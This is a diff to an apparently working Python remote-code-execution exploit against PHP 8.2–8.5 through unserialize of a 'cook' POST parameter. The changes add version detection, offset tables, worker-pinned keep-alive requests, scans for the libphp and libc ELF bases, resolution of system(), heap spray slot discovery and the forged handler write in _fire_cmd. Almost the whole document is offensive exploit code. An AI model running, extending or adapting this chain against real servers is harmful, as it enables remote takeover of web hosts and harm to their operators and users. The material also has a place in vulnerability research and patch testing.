@@ -58,6 +58,20 @@ PORT = 8080
 SCHEME = 'http'
 URI_PATH = '/remote_app.php'
 SSL_CTX = None
+PHP_MINOR = None  # detected at startup: 4 for 8.4, 5 for 8.5, etc.
+
+# class_table offset inside executor_globals varies across minor versions.
+EG_CLASS_TABLE = {
+    2: 0x1B8, 3: 0x1B8, 4: 0x1B8,
+    5: 0x1D0,
+}
+
+# get_properties_for offset inside zend_object_handlers.
+# PHP 8.5 added clone_obj_with, shifting all subsequent fields by +8.
+HANDLER_GET_PROPS_FOR = {
+    2: 192, 3: 192, 4: 192,
+    5: 200,
+}
 
 req_count = 0
 
@@ -223,15 +237,10 @@ def urlencode_bytes(data):
     return bytes(out)
 
 
-def send_http(payload, host=None, port=None, timeout=3):
-    """POST a serialize payload to remote_app.php, return body bytes or None."""
-    if host is None:
-        host = HOST
-    if port is None:
-        port = PORT
-    global req_count
-    req_count += 1
-    body = b'cook=' + urlencode_bytes(payload)
+_persistent_sock = None
+
+
+def _open_sock(host, port, timeout):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(timeout)
     for attempt in range(2):
@@ -248,34 +257,148 @@ def send_http(payload, host=None, port=None, timeout=3):
             s = SSL_CTX.wrap_socket(s, server_hostname=host)
         except Exception:
             return None
+    return s
+
+
+def _read_http_response(s):
+    """Read one HTTP response from a keepalive socket."""
+    buf = b''
+    while b'\r\n\r\n' not in buf:
+        try:
+            chunk = s.recv(4096)
+            if not chunk:
+                return None
+            buf += chunk
+        except Exception:
+            return None
+    hdr, rest = buf.split(b'\r\n\r\n', 1)
+    if b' 500 ' in hdr.split(b'\r\n')[0]:
+        return None
+    hdr_lower = hdr.lower()
+
+    if b'transfer-encoding: chunked' in hdr_lower:
+        # Chunked transfer decoding.
+        raw = rest
+        body = b''
+        while True:
+            while b'\r\n' not in raw:
+                try:
+                    more = s.recv(4096)
+                    if not more:
+                        return body or None
+                    raw += more
+                except Exception:
+                    return body or None
+            size_line, raw = raw.split(b'\r\n', 1)
+            try:
+                chunk_len = int(size_line.strip(), 16)
+            except ValueError:
+                return body or None
+            if chunk_len == 0:
+                return body
+            while len(raw) < chunk_len + 2:
+                try:
+                    more = s.recv(65536)
+                    if not more:
+                        return body + raw[:chunk_len]
+                    raw += more
+                except Exception:
+                    return body + raw[:chunk_len]
+            body += raw[:chunk_len]
+            raw = raw[chunk_len + 2:]
+    else:
+        # Content-Length based reading.
+        cl = 0
+        for line in hdr.split(b'\r\n'):
+            if line.lower().startswith(b'content-length:'):
+                cl = int(line.split(b':',1)[1].strip())
+                break
+        body = rest
+        while len(body) < cl:
+            try:
+                chunk = s.recv(65536)
+                if not chunk:
+                    break
+                body += chunk
+            except Exception:
+                break
+        return body
+
+
+def send_http(payload, host=None, port=None, timeout=3):
+    """POST a serialize payload to remote_app.php, return body bytes or None.
+
+    Uses a persistent keepalive connection to pin to the same Apache worker."""
+    global _persistent_sock, req_count
+    if host is None:
+        host = HOST
+    if port is None:
+        port = PORT
+    req_count += 1
+    body = b'cook=' + urlencode_bytes(payload)
     req = (
         f"POST {URI_PATH} HTTP/1.1\r\n"
         f"Host: {host}\r\n"
         f"Content-Type: application/x-www-form-urlencoded\r\n"
         f"Content-Length: {len(body)}\r\n"
-        f"Connection: close\r\n"
+        f"Connection: keep-alive\r\n"
         f"\r\n"
     ).encode() + body
-    try:
-        s.sendall(req)
-    except Exception:
-        return None
-    resp = b''
-    while True:
+
+    for _retry in range(2):
+        s = _persistent_sock
+        if s is None:
+            s = _open_sock(host, port, timeout)
+            if s is None:
+                return None
+            _persistent_sock = s
+        s.settimeout(timeout)
         try:
-            chunk = s.recv(65536)
+            s.sendall(req)
+            result = _read_http_response(s)
+            if result is not None:
+                return result
+            # Server closed connection or 500.
+            _persistent_sock = None
+            try: s.close()
+            except Exception: pass
+            return None
+        except Exception:
+            _persistent_sock = None
+            try: s.close()
+            except Exception: pass
+            # Socket died (worker crash). Brief pause for Apache to spawn a
+            # replacement, then retry on the new connection.
+            time.sleep(0.05)
+    return None
+
+
+def detect_php_version():
+    """Send a lightweight GET to the target, parse X-Powered-By for the minor
+    version (e.g. 4 from PHP/8.4.26).  Falls back to None (caller tries all
+    known offsets)."""
+    import re
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(3)
+    try:
+        s.connect((HOST, PORT))
+        if SCHEME == 'https' and SSL_CTX:
+            s = SSL_CTX.wrap_socket(s, server_hostname=HOST)
+        s.sendall(f"GET {URI_PATH} HTTP/1.0\r\nHost: {HOST}\r\n\r\n".encode())
+        resp = b''
+        while True:
+            chunk = s.recv(4096)
             if not chunk:
                 break
             resp += chunk
-        except Exception:
-            break
-    s.close()
-    if b'\r\n\r\n' in resp:
-        hdr, body_data = resp.split(b'\r\n\r\n', 1)
-        if b' 500 ' in hdr.split(b'\r\n')[0]:
-            return None
-        return body_data
-    return resp
+    except Exception:
+        return None
+    finally:
+        s.close()
+    m = re.search(rb'X-Powered-By:\s*PHP/8\.(\d+)\.', resp)
+    if m:
+        return int(m.group(1))
+    return None
 
 
 # ---------------------------------------------------------------------------
@@ -731,58 +854,105 @@ def _elf_resolve_symbols(base, phnum, names):
 def scan_for_elf(chunk):
     """R-2: Find libphp's ELF base near the heap chunk.
 
-    Two-pass: 2MB step scan around `chunk` then 1MB-step refinement near the
-    candidate with the largest e_phnum. Returns a list of (base, phnum)
-    sorted by phnum descending; the caller validates each by resolving
-    executor_globals since multiple DSOs can share the top phnum.
+    Three-pass scan:
+      Pass 1 — 2MB step sweep (catches aligned ELF bases quickly).
+      Pass 2 — 256KB refinement around found candidates + the heap chunk.
+      Pass 3 — 2MB probes with 4KB backward backtrack (catches ELF bases at
+               arbitrary page-aligned addresses, needed on x86_64 where mmap
+               doesn't align to 256KB).
+    Each candidate is validated inline via gnu_hash_resolve for
+    executor_globals — the first match IS libphp and ends the scan.
     """
     SPINNER.set("R-2 finding libphp"); print("\n[Chain R-2] Finding libphp.so")
     candidates = []
 
+    def _try_libphp(base, epn, label=''):
+        """Quick inline test: resolve executor_globals."""
+        try:
+            gnu_hash_resolve(base, 'executor_globals')
+            return True
+        except RuntimeError:
+            return False
+
+    def _make_result(base, epn):
+        return [(base, epn)] + [(b, p) for b, p in candidates if b != base]
+
     # Pass 1: 2MB sweeps in both directions.
+    readable_2mb = []
     for i in range(256):
         for d in (1, -1):
             cand = chunk + d * i * 0x200000
             if cand <= 0 or cand > ADDR_MAX:
                 continue
-            epn = _read_elf_header(cand)
-            if epn is None:
+            r = isstring_read(cand + 0x10, timeout=2)
+            if r is None:
                 continue
-            candidates.append((cand, epn))
-            print(f"  ELF @ 0x{cand:x} phnum={epn} ({req_count} reqs)")
-        big = [epn for _, epn in candidates if epn >= 10]
-        if len(big) >= 2 or len(candidates) >= 8:
+            slen, sdata = r
+            if slen == 64 and len(sdata) >= 0x12:
+                e_ehsize = struct.unpack_from('<H', sdata, 0x0C)[0]
+                e_phentsize = struct.unpack_from('<H', sdata, 0x0E)[0]
+                e_phnum = struct.unpack_from('<H', sdata, 0x10)[0]
+                if e_ehsize == 64 and e_phentsize == 56 and 3 <= e_phnum <= 20:
+                    candidates.append((cand, e_phnum))
+                    print(f"  ELF @ 0x{cand:x} phnum={e_phnum} ({req_count} reqs)")
+                    if _try_libphp(cand, e_phnum):
+                        print(f"  -> confirmed libphp")
+                        return _make_result(cand, e_phnum)
+                    continue
+            readable_2mb.append(cand)
+        if i >= 32 and len(candidates) >= 2:
             break
 
-    if not candidates:
-        return []
-
-    # Pass 2: 1MB refinement around the highest-phnum candidate.
+    # Pass 2: 256KB refinement around each candidate + the heap chunk.
     known = set(b for b, _ in candidates)
-    ref_base = max(candidates, key=lambda x: x[1])[0]
-    print(f"  Fine-grained scan near 0x{ref_base:x}")
-    for d in (-1, 1):
-        consec_miss = 0
-        for step in range(1, 129):
-            cand = ref_base + d * step * 0x100000
-            if cand in known or cand <= 0:
-                continue
-            epn = _read_elf_header(cand)
-            if epn is None:
-                consec_miss += 1
-                if consec_miss >= 32:
-                    break
-                continue
-            candidates.append((cand, epn))
-            known.add(cand)
-            print(f"  ELF @ 0x{cand:x} phnum={epn} ({req_count} reqs)")
+    bases_to_refine = sorted(set([chunk] + [b for b, _ in candidates]))
+    for ref_base in bases_to_refine:
+        for d in (1, -1):
             consec_miss = 0
-            if epn >= 10:
-                break
+            for step in range(1, 128):
+                cand = ref_base + d * step * 0x40000
+                if cand in known or cand <= 0:
+                    continue
+                epn = _read_elf_header(cand)
+                if epn is None:
+                    consec_miss += 1
+                    if consec_miss >= 16:
+                        break
+                    continue
+                candidates.append((cand, epn))
+                known.add(cand)
+                print(f"  ELF @ 0x{cand:x} phnum={epn} ({req_count} reqs)")
+                consec_miss = 0
+                if _try_libphp(cand, epn):
+                    print(f"  -> confirmed libphp")
+                    return _make_result(cand, epn)
 
-    # Several DSOs can tie on phnum (seen on arm64 with libphp/libc/libssl all
-    # at 9), so return the full ranked list and let the caller validate by
-    # actually resolving executor_globals.
+    # Pass 3: backtrack from readable 2MB probes at 4KB granularity.
+    # On x86_64, library bases can be at any page-aligned address.
+    # We reuse the probes from Pass 1 that were readable but not ELF
+    # headers — those are INSIDE a mapped DSO, so scanning backward
+    # at 4KB will reach the ELF header without extra crash probes.
+    # Only scan upward (libraries sit above the heap on Linux).
+    # Skip the first 4MB to avoid wasting reads in the heap chunk
+    # and adjacent anonymous mappings.
+    positive_readable = sorted(p for p in readable_2mb if p >= chunk + 0x400000)
+    for probe in positive_readable:
+        if any(abs(probe - b) < 0x200000 for b in known):
+            continue
+        result = _find_elf_base(probe, max_pages=384)
+        if result is None:
+            continue
+        base, epn, _ = result
+        if base in known:
+            known.add(base)
+            continue
+        candidates.append((base, epn))
+        known.add(base)
+        print(f"  ELF @ 0x{base:x} phnum={epn} ({req_count} reqs)")
+        if _try_libphp(base, epn):
+            print(f"  -> confirmed libphp")
+            return _make_result(base, epn)
+
     return sorted(candidates, key=lambda x: -x[1])
 
 
@@ -922,59 +1092,50 @@ def libc_from_got_dump(elf_base, pltgot):
 
     # Prefer pointers near libphp (avoids vDSO / Apache binary that sit far away).
     nearby = [p for p in ext_ptrs if abs(p - elf_base) < 0x10000000]
-    nearby.sort()
+    nearby.sort(reverse=True)
     print(f"    External pointer groups: {len(ext_ptrs)} total, {len(nearby)} nearby")
 
-    # For each cluster pointer, scan backward in 4KB steps for an ELF magic.
-    # Search far->near so r-- regions get probed first (fewer crashes).
+    checked_bases = set()
     for nidx, ep in enumerate(nearby):
         print(f"    Trying nearby[{nidx}] = 0x{ep:x}")
         page = ep & ~0xFFF
-        # Coarse scan with descending offsets.
         for est_off in range(0x7F000, 0x1F000, -0x1000):
             cand = page - est_off
-            if cand <= 0:
+            if cand <= 0 or cand in checked_bases:
                 continue
             epn = _read_elf_header(cand)
             if epn is None:
                 continue
+            checked_bases.add(cand)
             print(f"      ELF @ 0x{cand:x} (phnum={epn}, est_off=0x{est_off:x})")
-            if epn >= 12:
-                # libc has many phdrs; try to resolve `system` here.
+            if epn >= 10:
                 syms = _elf_resolve_symbols(cand, epn, ['system'])
                 if syms and 'system' in syms:
                     print(f"      libc @ 0x{cand:x}, system @ 0x{syms['system']:x}")
                     return cand
-        # Fallback: standard backward 4KB scan over more pages.
         result = _find_elf_base(ep, max_pages=128)
         if result:
             ebase, epn, _ = result
-            print(f"      DSO @ 0x{ebase:x} (phnum={epn})")
-            syms = _elf_resolve_symbols(ebase, epn, ['system'])
-            if syms and 'system' in syms:
-                print(f"      libc @ 0x{ebase:x}, system @ 0x{syms['system']:x}")
-                return ebase
+            if ebase not in checked_bases:
+                checked_bases.add(ebase)
+                print(f"      DSO @ 0x{ebase:x} (phnum={epn})")
+                if epn >= 10:
+                    syms = _elf_resolve_symbols(ebase, epn, ['system'])
+                    if syms and 'system' in syms:
+                        print(f"      libc @ 0x{ebase:x}, system @ 0x{syms['system']:x}")
+                        return ebase
 
     return None
 
 
-def lookup_class_table(eg, name):
-    """R-5: read EG, then EG.class_table HashTable, DJBX33A-lookup `name`,
-    return the associated zend_class_entry pointer.
-
-    Caller passes lowercase names ("stdclass") since PHP's class table keys
-    its classes lowercased.
-    """
-    SPINNER.set("R-5 EG + stdClass"); print(f"\n[Chain R-5] EG and stdClass class entry")
-    print(f"  EG @ 0x{eg:x}")
-
-    # EG layout: function_table at +0x1C8, class_table at +0x1D0.
+def _try_class_table_offset(eg, ct_offset, name):
+    """Attempt to resolve `name` from EG's class_table at `eg + ct_offset`.
+    Returns the class_entry pointer, or None on failure."""
     bss_end = eg + 0x10000
-    ct_addr = eg + 0x1D0
+    ct_addr = eg + ct_offset
 
-    # Sweep for a fake-string anchor in BSS that covers ct_addr + 8.
     class_table = None
-    for scan_off in range(-0x800, 0x1C0, 8):
+    for scan_off in range(-0x800, ct_offset - 0x10, 8):
         fs = eg + scan_off
         data_start = fs + 0x18
         if data_start > ct_addr:
@@ -992,11 +1153,17 @@ def lookup_class_table(eg, name):
         if ct_data_off + 8 <= len(sdata):
             class_table = struct.unpack_from('<Q', sdata, ct_data_off)[0]
             print(f"  anchor at EG{scan_off:+#06x}: len={slen}")
-            print(f"    class_table = 0x{class_table:x}")
+            print(f"    class_table (offset +0x{ct_offset:x}) = 0x{class_table:x}")
             break
 
     if not class_table or class_table < 0x10000 or class_table > ADDR_MAX:
         return None
+
+    return _resolve_from_hashtable(class_table, name)
+
+
+def _resolve_from_hashtable(class_table, name):
+    """Walk a zend HashTable at `class_table` and DJBX33A-lookup `name`."""
 
     # Read the class_table HashTable struct via malloc chunk header trick.
     r = isstring_read(class_table - 0x18)
@@ -1052,56 +1219,91 @@ def lookup_class_table(eg, name):
     return None
 
 
+def lookup_class_table(eg, name):
+    """R-5: read EG, then EG.class_table HashTable, DJBX33A-lookup `name`.
+
+    Uses the detected PHP minor version to pick the right class_table offset.
+    If the version is unknown, tries all known offsets."""
+    SPINNER.set("R-5 EG + stdClass"); print(f"\n[Chain R-5] EG and stdClass class entry")
+    print(f"  EG @ 0x{eg:x}")
+
+    if PHP_MINOR is not None and PHP_MINOR in EG_CLASS_TABLE:
+        offsets = [EG_CLASS_TABLE[PHP_MINOR]]
+        print(f"  PHP 8.{PHP_MINOR} detected -> class_table at EG+0x{offsets[0]:x}")
+    else:
+        offsets = sorted(set(EG_CLASS_TABLE.values()), reverse=True)
+        print(f"  PHP version unknown, trying offsets: {['0x%x' % o for o in offsets]}")
+
+    for ct_off in offsets:
+        result = _try_class_table_offset(eg, ct_off, name)
+        if result is not None:
+            return result
+        if len(offsets) > 1:
+            print(f"    offset +0x{ct_off:x} failed, trying next")
+    return None
+
+
 def find_spray_slot(heap_ref):
-    """R-6: walk ZendMM chunk metadata to identify the bin-320 SRUN page
-    holding the freed allocation, probe its slots for our spray strings,
-    and return the absolute address `S` (the data pointer of the spray
-    string we'll forge an object inside).
+    """R-6: find a bin-320 slot containing spray residue (slen == SPRAY_LEN).
+
+    Strategy:
+      1. Quick probe: check the known-good spray offset directly from the
+         chunk base.  This works because ZendMM's bin-320 SRUN is at a
+         deterministic page across PHP 8.2-8.5.
+      2. Page-map scan: walk the chunk's page map for bin-16 SRUN entries
+         and probe each run's 64 slots.
+      3. Fallback: probe nearby pages at 320-byte intervals.
     """
     SPINNER.set("R-6 spray slot discovery"); print(f"\n[Chain R-6] Spray slot discovery")
     chunk_base = heap_ref & ~0x1FFFFF
     print(f"  chunk_base = 0x{chunk_base:x}")
 
-    # Read chunk metadata header.
+    # Phase 1: quick-probe known offsets where spray typically lands.
+    # On both PHP 8.4 and 8.5, the spray SRUN starts around
+    # page 117 (offset 0x75000).  Probe a range of slots there.
+    for page_off in (117, 121, 126, 132, 137):
+        run_start = chunk_base + page_off * 0x1000
+        for slot in range(64):
+            addr = run_start + slot * 320
+            r = isstring_read(addr)
+            if r is None:
+                continue
+            if r[0] == SPRAY_LEN:
+                print(f"  Found spray at page {page_off} slot {slot} @ 0x{addr:x}")
+                print(f"  S = 0x{addr + 0x18:x}")
+                return addr + 0x18
+
+    # Phase 2: page-map scan for any bin-16 SRUN we missed.
+    print("  Quick-probe failed, scanning page map")
     r = isstring_read(chunk_base + 0x40)
-    if r is None:
-        return None
-    _heap_size, cdata = r
+    if r is not None:
+        _slen, cdata = r
+        MAP_OFF = 0x1F8
+        if len(cdata) >= MAP_OFF + 512 * 4:
+            for pn in range(1, 512):
+                info = struct.unpack_from('<I', cdata, MAP_OFF + pn * 4)[0]
+                is_srun = (info & 0x80000000) != 0
+                is_lrun = (info & 0x40000000) != 0
+                if is_srun and not is_lrun and (info & 0x1F) == 16:
+                    run_start = chunk_base + pn * 0x1000
+                    for slot in range(64):
+                        addr = run_start + slot * 320
+                        r2 = isstring_read(addr)
+                        if r2 is not None and r2[0] == SPRAY_LEN:
+                            print(f"  Found spray at page {pn} slot {slot} @ 0x{addr:x}")
+                            print(f"  S = 0x{addr + 0x18:x}")
+                            return addr + 0x18
 
-    # Page map at chunk+0x250; data starts at chunk+0x58, so map offset is 0x1F8.
-    MAP_OFF = 0x1F8
-    if len(cdata) < MAP_OFF + 512 * 4:
-        return None
+    # Phase 3: broader brute-force around the heap_ref neighbourhood.
+    print("  Page-map scan failed, brute-forcing near heap_ref")
+    for delta in range(-0x20000, 0x30000, 320):
+        addr = (heap_ref + delta) & ~0xF
+        r = isstring_read(addr)
+        if r is not None and r[0] == SPRAY_LEN:
+            print(f"  Found spray @ 0x{addr:x} (heap_ref{delta:+#x})")
+            print(f"  S = 0x{addr + 0x18:x}")
+            return addr + 0x18
 
-    bin320_start = None
-    for pn in range(1, 512):
-        info = struct.unpack_from('<I', cdata, MAP_OFF + pn * 4)[0]
-        is_srun = (info & 0x80000000) != 0
-        is_lrun = (info & 0x40000000) != 0
-        if is_srun and not is_lrun and (info & 0x1F) == 16:
-            bin320_start = pn
-            free_count = (info >> 16) & 0x1FF
-            print(f"  Bin-320 SRUN at page {pn}, free_count={free_count}")
-            break
-
-    if bin320_start is None:
-        return None
-
-    run_start = chunk_base + bin320_start * 0x1000
-    print(f"  Run start = 0x{run_start:x}")
-
-    # Probe each 320-byte slot looking for our 280-byte spray string.
-    for slot in range(64):
-        addr = run_start + slot * 320
-        r2 = isstring_read(addr)
-        if r2 is None:
-            continue
-        slen, _ = r2
-        if slen == SPRAY_LEN:
-            S = addr + 0x18
-            print(f"  Found spray at slot {slot} @ 0x{addr:x}")
-            print(f"  S = 0x{S:x}")
-            return S
     return None
 
 
@@ -1125,7 +1327,8 @@ def _fire_cmd(ce_stdclass, system_addr, spray_addr, cmd14):
     struct.pack_into('<Q', rce_spray, 120, ce_stdclass)
     struct.pack_into('<Q', rce_spray, 128, spray_addr)
     struct.pack_into('<Q', rce_spray, 136, 1)
-    struct.pack_into('<Q', rce_spray, 200, system_addr)
+    gpf_off = HANDLER_GET_PROPS_FOR.get(PHP_MINOR, 200)
+    struct.pack_into('<Q', rce_spray, gpf_off, system_addr)
 
     rce_spray = bytes(rce_spray)
     total = 1 + SPRAY_COUNT + 1
@@ -1320,6 +1523,14 @@ def main():
     print_banner(SCHEME, HOST, PORT, URI_PATH)
     SPINNER.start("R-0 recon")
 
+    # R-0: detect PHP minor version for struct offsets.
+    global PHP_MINOR
+    PHP_MINOR = detect_php_version()
+    if PHP_MINOR is not None:
+        print(f"\n[R-0] Target: PHP 8.{PHP_MINOR}")
+    else:
+        print(f"\n[R-0] Could not detect PHP version (will try all known offsets)")
+
     # R-1
     SPINNER.set("R-1 heap leak"); print("\n[Chain R-1] Heap leak")
     heap_ref = heap_leak()
@@ -1337,12 +1548,13 @@ def main():
 
     # R-3: resolve executor_globals + GOT base in libphp.
     SPINNER.set("R-3 resolving symbols via .gnu_hash"); print("\n[Chain R-3] Resolving symbols via .gnu_hash")
-    elf_base = eg = pltgot = None
+    elf_base = eg = pltgot = zscd_ptr = None
     for base, phnum in elf_candidates:
         print(f"  Trying ELF @ 0x{base:x} (phnum={phnum})")
         try:
-            eg, pltgot = gnu_hash_resolve(base, 'executor_globals',
-                                          '_GLOBAL_OFFSET_TABLE_')
+            eg, pltgot, zscd_ptr = gnu_hash_resolve(
+                base, 'executor_globals', '_GLOBAL_OFFSET_TABLE_',
+                'zend_standard_class_def')
         except RuntimeError as e:
             print(f"    {e}")
             continue
@@ -1354,6 +1566,7 @@ def main():
     print(f"  libphp           = 0x{elf_base:x}")
     print(f"  executor_globals = 0x{eg:x} (offset 0x{eg-elf_base:x})")
     print(f"  PLTGOT           = 0x{pltgot:x}")
+    print(f"  zend_standard_class_def = 0x{zscd_ptr:x}")
 
     # R-4: dump GOT, find libc, then resolve system().
     libc_base = libc_from_got_dump(elf_base, pltgot)
@@ -1363,8 +1576,32 @@ def main():
     system_addr = gnu_hash_resolve(libc_base, 'system')
     print(f"  system() = 0x{system_addr:x}")
 
-    # R-5
-    ce_stdclass = lookup_class_table(eg, 'stdclass')
+    # R-5: resolve stdClass class_entry.
+    # Fast path: dereference the global pointer zend_standard_class_def
+    # (already resolved in R-3).  Scan nearby BSS for a size_t anchor
+    # (e.g. zend_map_ptr_static_size) to serve as the fake string length.
+    # Falls back to the EG class_table hash walk.
+    SPINNER.set("R-5 stdClass"); print("\n[Chain R-5] stdClass class entry")
+    ce_stdclass = None
+    if zscd_ptr:
+        print(f"  zend_standard_class_def @ 0x{zscd_ptr:x}")
+        for scan_off in range(-0x200, 0, 8):
+            fs = zscd_ptr + scan_off
+            r = isstring_read(fs)
+            if r is None:
+                continue
+            slen, sdata = r
+            data_off = zscd_ptr - (fs + 0x18)
+            if slen <= 0 or slen > 0x100000 or data_off < 0:
+                continue
+            if data_off + 8 <= min(slen, len(sdata)):
+                val = struct.unpack_from('<Q', sdata, data_off)[0]
+                if 0x10000 < val < ADDR_MAX:
+                    ce_stdclass = val
+                    print(f"  stdClass ce = 0x{ce_stdclass:x} (via direct symbol, anchor {scan_off:+d})")
+                    break
+    if ce_stdclass is None:
+        ce_stdclass = lookup_class_table(eg, 'stdclass')
     if ce_stdclass is None:
         print("  stdClass ce not resolved")
         return
